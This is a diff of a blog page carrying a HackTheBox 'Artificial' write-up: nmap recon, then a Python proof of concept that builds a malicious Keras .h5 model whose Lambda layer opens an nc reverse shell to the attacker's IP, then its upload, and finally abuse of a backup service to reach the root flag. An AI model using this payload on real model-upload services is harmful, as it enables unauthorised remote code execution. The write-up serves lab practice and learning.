-<img class=lazyload src=/f0dh1l/svg/loading.min.svg data-src=/f0dh1l/images/htb_artificial/image-15.png data-srcset="/f0dh1l/images/htb_artificial/image-15.png, /f0dh1l/images/htb_artificial/image-15.png 1.5x, /f0dh1l/images/htb_artificial/image-15.png 2x" data-sizes=auto alt=/f0dh1l/images/htb_artificial/image-15.png title="Restore in progress"></p><p><strong>Step 5:</strong> Finally, I downloaded the backup archive containing the root flag:</p><p><img class=lazyload src=/f0dh1l/svg/loading.min.svg data-src=/f0dh1l/images/htb_artificial/image-16.png data-srcset="/f0dh1l/images/htb_artificial/image-16.png, /f0dh1l/images/htb_artificial/image-16.png 1.5x, /f0dh1l/images/htb_artificial/image-16.png 2x" data-sizes=auto alt=/f0dh1l/images/htb_artificial/image-16.png title="Downloading archive"></p><p>Extracting the archive revealed the coveted root flag:</p><p><img class=lazyload src=/f0dh1l/svg/loading.min.svg data-src=/f0dh1l/images/htb_artificial/image-17.png data-srcset="/f0dh1l/images/htb_artificial/image-17.png, /f0dh1l/images/htb_artificial/image-17.png 1.5x, /f0dh1l/images/htb_artificial/image-17.png 2x" data-sizes=auto alt=/f0dh1l/images/htb_artificial/image-17.png title="Root flag obtained"></p><p>🎉 <strong>Machine pwned!</strong></p><hr><h2 id=conclusion>Conclusion</h2><p>The &ldquo;Artificial&rdquo; machine provided an excellent learning experience showcasing:</p><ol><li><strong>Supply Chain Vulnerabilities</strong>: The danger of accepting user-uploaded models in ML applications</li><li><strong>Environment Replication</strong>: How vulnerability exploitation often requires precise environment matching</li><li><strong>Credential Discovery</strong>: Finding sensitive data in databases and configuration files</li><li><strong>Group Privileges</strong>: Leveraging group memberships for information disclosure</li><li><strong>Service Enumeration</strong>: Discovering internal services through configuration analysis</li><li><strong>Privilege Escalation</strong>: Abusing backup service functionality to read privileged files</li></ol><p>This box emphasizes the importance of validating all user inputs, even seemingly innocuous files like ML models, and highlights how backup services can become attack vectors when improperly secured.</p><hr><p><strong>Thanks for reading! I hope you enjoyed it, Happy hacking! 🚀</strong></p></div><div class=post-footer id=post-footer><div class=post-info><div class=post-info-line><div class=post-info-mod><span>Updated on 2025-10-23</span></div></div><div class=post-info-line><div class=post-info-md></div><div class=post-info-share><span><a href=javascript:void(0); title="Share on X" data-sharer=x data-url=https://fodhil-ben.github.io/f0dh1l/posts/htb_artificial/ data-title='HTB Machine Writeup "Artificial"' data-via=Benhibafodhil data-hashtags=HTB,Linux><i class="fab fa-x-twitter fa-fw" aria-hidden=true></i></a><a href=javascript:void(0); title="Share on Threads" data-sharer=threads data-url=https://fodhil-ben.github.io/f0dh1l/posts/htb_artificial/ data-title='HTB Machine Writeup "Artificial"'><i class="fab fa-threads fa-fw" aria-hidden=true></i></a><a href=javascript:void(0); title="Share on Facebook" data-sharer=facebook data-url=https://fodhil-ben.github.io/f0dh1l/posts/htb_artificial/ data-hashtag=HTB><i class="fab fa-facebook-square fa-fw" aria-hidden=true></i></a><a href=javascript:void(0); title="Share on Hacker News" data-sharer=hackernews data-url=https://fodhil-ben.github.io/f0dh1l/posts/htb_artificial/ data-title='HTB Machine Writeup "Artificial"'><i class="fab fa-hacker-news fa-fw" aria-hidden=true></i></a><a href=javascript:void(0); title="Share on Line" data-sharer=line data-url=https://fodhil-ben.github.io/f0dh1l/posts/htb_artificial/ data-title='HTB Machine Writeup "Artificial"'><i data-svg-src=https://cdn.jsdelivr.net/npm/simple-icons@15.14.0/icons/line.svg aria-hidden=true></i></a><a href=javascript:void(0); title="Share on 微博" data-sharer=weibo data-url=https://fodhil-ben.github.io/f0dh1l/posts/htb_artificial/ data-title='HTB Machine Writeup "Artificial"'><i class="fab fa-weibo fa-fw" aria-hidden=true></i></a><a href=javascript:void(0); title="Share on Diaspora" data-sharer=diaspora data-url=https://fodhil-ben.github.io/f0dh1l/posts/htb_artificial/ data-title='HTB Machine Writeup "Artificial"' data-description><i class="fab fa-diaspora fa-fw" aria-hidden=true></i></a><a href="https://t.me/share/url?url=https%3a%2f%2ffodhil-ben.github.io%2ff0dh1l%2fposts%2fhtb_artificial%2f&amp;text=HTB%20Machine%20Writeup%20%22Artificial%22" target=_blank title="Share on Telegram"><i class="fab fa-telegram fa-fw" aria-hidden=true></i></a></span></div></div></div><div class=post-info-more><section class=post-tags><i class="fas fa-tags fa-fw" aria-hidden=true></i>&nbsp;<a href=/f0dh1l/tags/htb/>HTB</a>,&nbsp;<a href=/f0dh1l/tags/linux/>Linux</a></section><section><span><a href=javascript:void(0); onclick=window.history.back()>Back</a></span>&nbsp;|&nbsp;<span><a href=/f0dh1l/>Home</a></span></section></div><div class=post-nav><a href=/f0dh1l/posts/first-h1-bounty/ class=prev rel=prev title="My First H1 Bounty: From Open Redirect to Profile Manipulation"><i class="fas fa-angle-left fa-fw" aria-hidden=true></i>My First H1 Bounty: From Open Redirect to Profile Manipulation</a>
-<a href=/f0dh1l/posts/htb_tombwatcher/ class=next rel=next title='HTB Machine Writeup "TombWatcher"'>HTB Machine Writeup "TombWatcher"<i class="fas fa-angle-right fa-fw" aria-hidden=true></i></a></div></div></article></div></main><footer class=footer><div class=footer-container><div class=footer-line>Powered by <a href=https://gohugo.io/ target=_blank rel="noopener noreffer" title="Hugo 0.145.0">Hugo</a> | Theme - <a href=https://github.com/dillonzq/LoveIt target=_blank rel="noopener noreffer" title="LoveIt 0.3.1-DEV"><i class="far fa-kiss-wink-heart fa-fw" aria-hidden=true></i> LoveIt</a></div><div class=footer-line itemscope itemtype=http://schema.org/CreativeWork><i class="far fa-copyright fa-fw" aria-hidden=true></i><span itemprop=copyrightYear>2025</span><span class=author itemprop=copyrightHolder>&nbsp;<a href=/f0dh1l/ target=_blank>F0DH1L</a></span></div></div></footer></div><div id=fixed-buttons><a href=# id=back-to-top class=fixed-button title="Back to Top"><i class="fas fa-arrow-up fa-fw" aria-hidden=true></i></a></div><div id=fixed-buttons-hidden><a href=# id=view-comments class=fixed-button title="View Comments"><i class="fas fa-comment fa-fw" aria-hidden=true></i></a></div><link rel=stylesheet href=/f0dh1l/css/custom.css><script src=https://cdn.jsdelivr.net/npm/lazysizes@5.3.2/lazysizes.min.js></script><script src=https://cdn.jsdelivr.net/npm/clipboard@2.0.11/dist/clipboard.min.js></script><script src=https://cdn.jsdelivr.net/npm/sharer.js@0.5.2/sharer.min.js></script><script>window.config={comment:{}}</script><script src=/f0dh1l/js/theme.min.js></script></body></html>
+<!DOCTYPE html>
+<html lang="en">
+    <head><script src="/f0dh1l/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=f0dh1l/livereload" data-no-instant defer></script>
+        <meta charset="utf-8">
+        <meta name="viewport" content="width=device-width, initial-scale=1">
+        <meta name="robots" content="noodp" />
+        <title>HTB Machine Writeup &#34;Artificial&#34; - My Personal Blog</title><meta name="Description" content="This is my personal blog"><meta property="og:url" content="http://localhost:1313/f0dh1l/posts/htb_artificial/">
+  <meta property="og:site_name" content="My Personal Blog">
+  <meta property="og:title" content="HTB Machine Writeup &#34;Artificial&#34;">
+  <meta property="og:description" content="HTB Machine: Artificial - Writeup Machine Information Difficulty: Easy OS: Linux Key Concepts: TensorFlow/Keras Vulnerability, File Upload, Privilege Escalation Through Backrest service Overview Artificial is an Easy Linux machine from HackTheBox that demonstrates the dangers of accepting user uploaded machine learning models. The path to root involves exploiting a TensorFlow remote code execution vulnerability, database credential extraction, and abusing a backup service to read the root flag.">
+  <meta property="og:locale" content="en">
+  <meta property="og:type" content="article">
+    <meta property="article:section" content="posts">
+    <meta property="article:published_time" content="2025-10-23T13:48:04+01:00">
+    <meta property="article:modified_time" content="2025-10-23T13:48:04+01:00">
+    <meta property="article:tag" content="HTB">
+    <meta property="article:tag" content="Linux">
+
+  <meta name="twitter:card" content="summary">
+  <meta name="twitter:title" content="HTB Machine Writeup &#34;Artificial&#34;">
+  <meta name="twitter:description" content="HTB Machine: Artificial - Writeup Machine Information Difficulty: Easy OS: Linux Key Concepts: TensorFlow/Keras Vulnerability, File Upload, Privilege Escalation Through Backrest service Overview Artificial is an Easy Linux machine from HackTheBox that demonstrates the dangers of accepting user uploaded machine learning models. The path to root involves exploiting a TensorFlow remote code execution vulnerability, database credential extraction, and abusing a backup service to read the root flag.">
+<meta name="application-name" content="My Personal Blog">
+<meta name="apple-mobile-web-app-title" content="My Personal Blog">
+<meta name="referrer" content="no-referrer" /><meta name="theme-color" content="#ffffff"><meta name="msapplication-TileColor" content="#da532c"><link rel="shortcut icon" type="image/x-icon" href="/favicon.ico" />
+        <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
+        <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5"><link rel="manifest" href="/site.webmanifest"><link rel="canonical" href="http://localhost:1313/f0dh1l/posts/htb_artificial/" /><link rel="prev" href="http://localhost:1313/f0dh1l/posts/first-h1-bounty/" /><link rel="next" href="http://localhost:1313/f0dh1l/posts/htb_tombwatcher/" /><link rel="stylesheet" href="/f0dh1l/css/style.min.css"><link rel="preload" href="/f0dh1l/lib/fontawesome-free/css/all.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
+        <noscript><link rel="stylesheet" href="/f0dh1l/lib/fontawesome-free/css/all.min.css"></noscript><link rel="preload" href="/f0dh1l/lib/animate/animate.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
+        <noscript><link rel="stylesheet" href="/f0dh1l/lib/animate/animate.min.css"></noscript><script type="application/ld+json">
+    {
+        "@context": "http://schema.org",
+        "@type": "BlogPosting",
+        "headline": "HTB Machine Writeup \"Artificial\"",
+        "inLanguage": "en",
+        "mainEntityOfPage": {
+            "@type": "WebPage",
+            "@id": "http:\/\/localhost:1313\/f0dh1l\/posts\/htb_artificial\/"
+        },"genre": "posts","keywords": "HTB, Linux","wordcount":  1096 ,
+        "url": "http:\/\/localhost:1313\/f0dh1l\/posts\/htb_artificial\/","datePublished": "2025-10-23T13:48:04+01:00","dateModified": "2025-10-23T13:48:04+01:00","license": "2025 F0DH1L","publisher": {
+            "@type": "Organization",
+            "name": ""},"author": {
+                "@type": "Person",
+                "name": "F0DH1L"
+            },"description": ""
+    }
+    </script></head>
+    <body data-header-desktop="fixed" data-header-mobile="auto"><script>
+          const query = window.matchMedia('(prefers-color-scheme: dark)');
+          function applyTheme() {
+            let theme = window.localStorage?.getItem('theme') || 'dark';
+            let isDark = theme === 'dark' || (theme === 'auto' && query.matches);
+            document.body.setAttribute('theme', isDark? 'dark' : 'light');
+            document.body.setAttribute('cfg-theme', theme);
+          }
+
+          applyTheme();
+          query.addEventListener('change', applyTheme);
+        </script>
+
+        <div id="mask"></div><div class="wrapper"><header class="desktop" id="header-desktop">
+    <div class="header-wrapper">
+        <div class="header-title">
+            <a href="/f0dh1l/" title="My Personal Blog">F0DH1L Blog</a>
+        </div>
+        <div class="menu">
+            <div class="menu-inner"><a class="menu-item" href="/f0dh1l/posts/"> Posts </a><a class="menu-item" href="/f0dh1l/tags/"> Tags </a><a class="menu-item" href="/f0dh1l/about/"> About </a><span class="menu-item delimiter"></span><a href="javascript:void(0);" class="menu-item theme-switch" title="Switch Theme">
+                    <i class="fas fa-adjust fa-fw" aria-hidden="true"></i>
+                </a></div>
+        </div>
+    </div>
+</header><header class="mobile" id="header-mobile">
+    <div class="header-container">
+        <div class="header-wrapper">
+            <div class="header-title">
+                <a href="/f0dh1l/" title="My Personal Blog">F0DH1L Blog</a>
+            </div>
+            <div class="menu-toggle" id="menu-toggle-mobile">
+                <span></span><span></span><span></span>
+            </div>
+        </div>
+        <div class="menu" id="menu-mobile"><a class="menu-item" href="/f0dh1l/posts/" title="">Posts</a><a class="menu-item" href="/f0dh1l/tags/" title="">Tags</a><a class="menu-item" href="/f0dh1l/about/" title="">About</a><a href="javascript:void(0);" class="menu-item theme-switch" title="Switch Theme">
+                <i class="fas fa-adjust fa-fw" aria-hidden="true"></i>
+            </a></div>
+    </div>
+</header><main class="main">
+                <div class="container"><div class="toc" id="toc-auto">
+            <h2 class="toc-title">Contents</h2>
+            <div class="toc-content" id="toc-content-auto"></div>
+        </div><article class="page single"><h1 class="single-title animate__animated animate__flipInX">HTB Machine Writeup "Artificial"</h1><div class="post-meta">
+            <div class="post-meta-line"><span class="post-author"><a href="/f0dh1l/" title="Author" rel="author" class="author"><i class="fas fa-user-circle fa-fw" aria-hidden="true"></i>F0DH1L</a></span></div>
+            <div class="post-meta-line"><i class="far fa-calendar-alt fa-fw" aria-hidden="true"></i>&nbsp;<time datetime="2025-10-23">2025-10-23</time>&nbsp;<i class="fas fa-pencil-alt fa-fw" aria-hidden="true"></i>&nbsp;1096 words&nbsp;
+                <i class="far fa-clock fa-fw" aria-hidden="true"></i>&nbsp;6 minutes&nbsp;</div>
+        </div><div class="details toc" id="toc-static"  data-kept="">
+                <div class="details-summary toc-title">
+                    <span>Contents</span>
+                    <span><i class="details-icon fas fa-angle-right" aria-hidden="true"></i></span>
+                </div>
+                <div class="details-content toc-content" id="toc-content-static"><nav id="TableOfContents">
+  <ul>
+    <li><a href="#machine-information">Machine Information</a></li>
+    <li><a href="#overview">Overview</a></li>
+    <li><a href="#reconnaissance">Reconnaissance</a></li>
+    <li><a href="#web-application-a-machine-learning-platform">Web Application: A Machine Learning Platform</a></li>
+    <li><a href="#exploitation">Exploitation</a></li>
+    <li><a href="#initial-access-triggering-the-payload">Initial Access: Triggering the Payload</a></li>
+    <li><a href="#lateral-movement-finding-user-credentials">Lateral Movement: Finding User Credentials</a></li>
+    <li><a href="#privilege-escalation-the-path-to-root">Privilege Escalation: The Path to Root</a>
+      <ul>
+        <li><a href="#analyzing-the-backup">Analyzing the Backup</a></li>
+        <li><a href="#discovering-the-hidden-service">Discovering the Hidden Service</a></li>
+        <li><a href="#exploiting-backrest-for-root-access">Exploiting Backrest for Root Access</a></li>
+      </ul>
+    </li>
+    <li><a href="#conclusion">Conclusion</a></li>
+  </ul>
+</nav></div>
+            </div><div class="content" id="content"><h1 id="htb-machine-artificial---writeup">HTB Machine: Artificial - Writeup</h1>
+<h2 id="machine-information">Machine Information</h2>
+<ul>
+<li><strong>Difficulty</strong>: Easy</li>
+<li><strong>OS</strong>: Linux</li>
+<li><strong>Key Concepts</strong>: TensorFlow/Keras Vulnerability, File Upload, Privilege Escalation Through Backrest service</li>
+</ul>
+<p><img
+        class="lazyload"
+        src="/f0dh1l/svg/loading.min.svg"
+        data-src="/f0dh1l/images/htb_artificial/image-18.png"
+        data-srcset="/f0dh1l/images/htb_artificial/image-18.png, /f0dh1l/images/htb_artificial/image-18.png 1.5x, /f0dh1l/images/htb_artificial/image-18.png 2x"
+        data-sizes="auto"
+        alt="/f0dh1l/images/htb_artificial/image-18.png"
+        title="Solve Screenshot" /></p>
+<h2 id="overview">Overview</h2>
+<p><strong>Artificial</strong> is an Easy Linux machine from HackTheBox that demonstrates the dangers of accepting user uploaded machine learning models. The path to root involves exploiting a TensorFlow remote code execution vulnerability, database credential extraction, and abusing a backup service to read the root flag.</p>
+<h2 id="reconnaissance">Reconnaissance</h2>
+<p>First Thing to do as always i launched an nmap scan to identify open services. The results revealed just SSH on port 22 and an HTTP server on port 80.</p>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-bash">
+        <span class="code-title"><i class="arrow fas fa-angle-right fa-fw" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># Nmap 7.94SVN scan initiated Mon Oct 13 10:52:32 2025 as: nmap -sC -sV -Pn -oN nmap_scan.txt -vv 10.10.11.74</span>
+</span></span><span class="line"><span class="cl">Increasing send delay <span class="k">for</span> 10.10.11.74 from <span class="m">0</span> to <span class="m">5</span> due to <span class="m">11</span> out of <span class="m">11</span> dropped probes since last increase.
+</span></span><span class="line"><span class="cl">Nmap scan report <span class="k">for</span> 10.10.11.74
+</span></span><span class="line"><span class="cl">Host is up, received user-set <span class="o">(</span>0.34s latency<span class="o">)</span>.
+</span></span><span class="line"><span class="cl">Scanned at 2025-10-13 10:52:32 CET <span class="k">for</span> 68s
+</span></span><span class="line"><span class="cl">Not shown: <span class="m">998</span> closed tcp ports <span class="o">(</span>conn-refused<span class="o">)</span>
+</span></span><span class="line"><span class="cl">PORT   STATE SERVICE REASON  VERSION
+</span></span><span class="line"><span class="cl">22/tcp open  ssh     syn-ack OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 <span class="o">(</span>Ubuntu Linux<span class="p">;</span> protocol 2.0<span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span> ssh-hostkey: 
+</span></span><span class="line"><span class="cl"><span class="p">|</span>   <span class="m">3072</span> 7c:e4:8d:84:c5:de:91:3a:5a:2b:9d:34:ed:d6:99:17 <span class="o">(</span>RSA<span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span> ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDNABz8gRtjOqG4+jUCJb2NFlaw1auQlaXe1/+I+BhqrriREBnu476PNw6mFG9ifT57WWE/qvAZQFYRvPupReMJD4C3bE3fSLbXAoP03+7JrZkNmPRpVetRjUwP1acu7golA8MnPGzGa2UW38oK/TnkJDlZgRpQq/7DswCr38IPxvHNO/15iizgOETTTEU8pMtUm/ISNQfPcGLGc0x5hWxCPbu75OOOsPt2vA2qD4/sb9bDCOR57bAt4i+WEqp7Ri/act+f4k6vypm1sebNXeYaKapw+W83en2LnJOU0lsdhJiAPKaD/srZRZKOR0bsPcKOqLWQR/A6Yy3iRE8fcKXzfbhYbLUiXZzuUJoEMW33l8uHuAza57PdiMFnKqLQ6LBfwYs64Q3v8oAn5O7upCI/nDQ6raclTSigAKpPbliaL0HE/P7UhNacrGE7Gsk/FwADiXgEAseTn609wBnLzXyhLzLb4UVu9yFRWITkYQ6vq4ZqsiEnAsur/jt8WZY6MQ8<span class="o">=</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span>   <span class="m">256</span> 83:46:2d:cf:73:6d:28:6f:11:d5:1d:b4:88:20:d6:7c <span class="o">(</span>ECDSA<span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span> ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBOdlb8oU9PsHX8FEPY7DijTkQzsjeFKFf/xgsEav4qedwBUFzOetbfQNn3ZrQ9PMIHrguBG+cXlA2gtzK4NPohU<span class="o">=</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span>   <span class="m">256</span> e3:18:2e:3b:40:61:b4:59:87:e8:4a:29:24:0f:6a:fc <span class="o">(</span>ED25519<span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIH8QL1LMgQkZcpxuylBjhjosiCxcStKt8xOBU0TjCNmD
+</span></span><span class="line"><span class="cl">80/tcp open  http    syn-ack nginx 1.18.0 <span class="o">(</span>Ubuntu<span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_http-title: Did not follow redirect to http://artificial.htb/
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_http-server-header: nginx/1.18.0 <span class="o">(</span>Ubuntu<span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span> http-methods: 
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_  Supported Methods: GET HEAD POST OPTIONS
+</span></span><span class="line"><span class="cl">Service Info: OS: Linux<span class="p">;</span> CPE: cpe:/o:linux:linux_kernel
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Read data files from: /usr/bin/../share/nmap
+</span></span><span class="line"><span class="cl">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+</span></span><span class="line"><span class="cl"><span class="c1"># Nmap done at Mon Oct 13 10:53:40 2025 -- 1 IP address (1 host up) scanned in 68.99 seconds</span></span></span></code></pre></div></div>
+<p>The web server caught my attention, After adding this to my <code>/etc/hosts</code> file, I navigated to the website.</p>
+<hr>
+<h2 id="web-application-a-machine-learning-platform">Web Application: A Machine Learning Platform</h2>
+<p>The landing page presented an interesting web application focused on machine learning model hosting. After registering an account and login i was redirected to the main page.</p>
+<p><img
+        class="lazyload"
+        src="/f0dh1l/svg/loading.min.svg"
+        data-src="/f0dh1l/images/htb_artificial/image.png"
+        data-srcset="/f0dh1l/images/htb_artificial/image.png, /f0dh1l/images/htb_artificial/image.png 1.5x, /f0dh1l/images/htb_artificial/image.png 2x"
+        data-sizes="auto"
+        alt="/f0dh1l/images/htb_artificial/image.png"
+        title="Website homepage" /></p>
+<p>The platform featured a file upload functionality specifically designed for machine learning models. What made this particularly interesting was the accepted file format: <code>.h5</code> files, which are Keras model files.</p>
+<p><img
+        class="lazyload"
+        src="/f0dh1l/svg/loading.min.svg"
+        data-src="/f0dh1l/images/htb_artificial/image-1.png"
+        data-srcset="/f0dh1l/images/htb_artificial/image-1.png, /f0dh1l/images/htb_artificial/image-1.png 1.5x, /f0dh1l/images/htb_artificial/image-1.png 2x"
+        data-sizes="auto"
+        alt="/f0dh1l/images/htb_artificial/image-1.png"
+        title="File upload page" /></p>
+<p>Exploring further, I discovered downloadable files that revealed crucial information about the backend infrastructure - a <code>Dockerfile</code> and <code>requirements.txt</code>. These files exposed the technology stack in use:</p>
+<p><strong>requirements.txt:</strong></p>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-">
+        <span class="code-title"><i class="arrow fas fa-angle-right fa-fw" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
+    </div><pre tabindex="0"><code>tensorflow-cpu==2.13.1</code></pre></div>
+<p><strong>Dockerfile:</strong></p>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-dockerfile">
+        <span class="code-title"><i class="arrow fas fa-angle-right fa-fw" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-dockerfile" data-lang="dockerfile"><span class="line"><span class="cl"><span class="k">FROM</span><span class="s"> python:3.8-slim</span><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="k">WORKDIR</span><span class="s"> /code</span><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="k">RUN</span> apt-get update <span class="o">&amp;&amp;</span> <span class="se">\
+</span></span></span><span class="line"><span class="cl"><span class="se"></span>    apt-get install -y curl <span class="o">&amp;&amp;</span> <span class="se">\
+</span></span></span><span class="line"><span class="cl"><span class="se"></span>    curl -k -LO https://files.pythonhosted.org/packages/65/ad/4e090ca3b4de53404df9d1247c8a371346737862cfe539e7516fd23149a4/tensorflow_cpu-2.13.1-cp38-cp38-manylinux_2_17_x86_64.manylinux2014_x86_64.whl <span class="o">&amp;&amp;</span> <span class="se">\
+</span></span></span><span class="line"><span class="cl"><span class="se"></span>    rm -rf /var/lib/apt/lists/*<span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="k">RUN</span> pip install ./tensorflow_cpu-2.13.1-cp38-cp38-manylinux_2_17_x86_64.manylinux2014_x86_64.whl<span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="k">ENTRYPOINT</span> <span class="p">[</span><span class="s2">&#34;/bin/bash&#34;</span><span class="p">]</span></span></span></code></pre></div></div>
+<p>The specific TensorFlow version immediately set off alarm bells. I knew that accepting user-uploaded model files could be dangerous, especially with specific versions that might have known vulnerabilities.</p>
+<hr>
+<h2 id="exploitation">Exploitation</h2>
+<p>After some research, I discovered a critical vulnerability: TensorFlow Remote Code Execution through malicious model files. The vulnerability allows arbitrary code execution when a crafted <code>.h5</code> model is loaded.</p>
+<p><strong>Reference:</strong> <a href="https://mastersplinter.work/research/tensorflow-rce/" target="_blank" rel="noopener noreffer ">https://mastersplinter.work/research/tensorflow-rce/</a></p>
+<p>I crafted a proof of concept that would give me a reverse shell upon model loading:</p>
+<p><strong>poc.py:</strong></p>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-python">
+        <span class="code-title"><i class="arrow fas fa-angle-right fa-fw" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">tensorflow</span> <span class="k">as</span> <span class="nn">tf</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">exploit</span><span class="p">(</span><span class="n">x</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">    <span class="kn">import</span> <span class="nn">os</span>
+</span></span><span class="line"><span class="cl">    <span class="n">os</span><span class="o">.</span><span class="n">system</span><span class="p">(</span><span class="s2">&#34;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 10.10.16.56 4444 &gt;/tmp/f&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">x</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">model</span> <span class="o">=</span> <span class="n">tf</span><span class="o">.</span><span class="n">keras</span><span class="o">.</span><span class="n">Sequential</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl"><span class="n">model</span><span class="o">.</span><span class="n">add</span><span class="p">(</span><span class="n">tf</span><span class="o">.</span><span class="n">keras</span><span class="o">.</span><span class="n">layers</span><span class="o">.</span><span class="n">Input</span><span class="p">(</span><span class="n">shape</span><span class="o">=</span><span class="p">(</span><span class="mi">64</span><span class="p">,)))</span>
+</span></span><span class="line"><span class="cl"><span class="n">model</span><span class="o">.</span><span class="n">add</span><span class="p">(</span><span class="n">tf</span><span class="o">.</span><span class="n">keras</span><span class="o">.</span><span class="n">layers</span><span class="o">.</span><span class="n">Lambda</span><span class="p">(</span><span class="n">exploit</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl"><span class="n">model</span><span class="o">.</span><span class="n">compile</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl"><span class="n">model</span><span class="o">.</span><span class="n">save</span><span class="p">(</span><span class="s2">&#34;exploit.h5&#34;</span><span class="p">)</span></span></span></code></pre></div></div>
+<p>The tricky part? Getting the exact environment match. My initial attempts in a local virtual environment failed, even with the exact version from <code>requirements.txt</code>. The solution was to replicate the production environment precisely using the provided Dockerfile.</p>
+<p>I spun up a Docker container with the exact configuration and compiled the malicious model inside:</p>
+<p><img
+        class="lazyload"
+        src="/f0dh1l/svg/loading.min.svg"
+        data-src="/f0dh1l/images/htb_artificial/image-2.png"
+        data-srcset="/f0dh1l/images/htb_artificial/image-2.png, /f0dh1l/images/htb_artificial/image-2.png 1.5x, /f0dh1l/images/htb_artificial/image-2.png 2x"
+        data-sizes="auto"
+        alt="/f0dh1l/images/htb_artificial/image-2.png"
+        title="Compiling exploit in Docker" /></p>
+<p>With the weaponized <code>exploit.h5</code> file in hand, I extracted it from the container and prepared for deployment.</p>
+<hr>
+<h2 id="initial-access-triggering-the-payload">Initial Access: Triggering the Payload</h2>
+<p>I uploaded the malicious model through the web interface:</p>
+<p><img
+        class="lazyload"
+        src="/f0dh1l/svg/loading.min.svg"
+        data-src="/f0dh1l/images/htb_artificial/image-3.png"
+        data-srcset="/f0dh1l/images/htb_artificial/image-3.png, /f0dh1l/images/htb_artificial/image-3.png 1.5x, /f0dh1l/images/htb_artificial/image-3.png 2x"
+        data-sizes="auto"
+        alt="/f0dh1l/images/htb_artificial/image-3.png"
+        title="Uploading malicious model" /></p>
+<p>With my netcat listener ready on port 4444, I triggered the model execution:</p>
+<p><img
+        class="lazyload"
+        src="/f0dh1l/svg/loading.min.svg"
+        data-src="/f0dh1l/images/htb_artificial/image-4.png"
+        data-srcset="/f0dh1l/images/htb_artificial/image-4.png, /f0dh1l/images/htb_artificial/image-4.png 1.5x, /f0dh1l/images/htb_artificial/image-4.png 2x"
+        data-sizes="auto"
+        alt="/f0dh1l/images/htb_artificial/image-4.png"
+        title="Triggering model execution" /></p>
+<p>Success! The reverse shell connected back to my machine:</p>
+<p><img
+        class="lazyload"
+        src="/f0dh1l/svg/loading.min.svg"
+        data-src="/f0dh1l/images/htb_artificial/image-5.png"
+        data-srcset="/f0dh1l/images/htb_artificial/image-5.png, /f0dh1l/images/htb_artificial/image-5.png 1.5x, /f0dh1l/images/htb_artificial/image-5.png 2x"
+        data-sizes="auto"
+        alt="/f0dh1l/images/htb_artificial/image-5.png"
+        title="Reverse shell obtained" /></p>
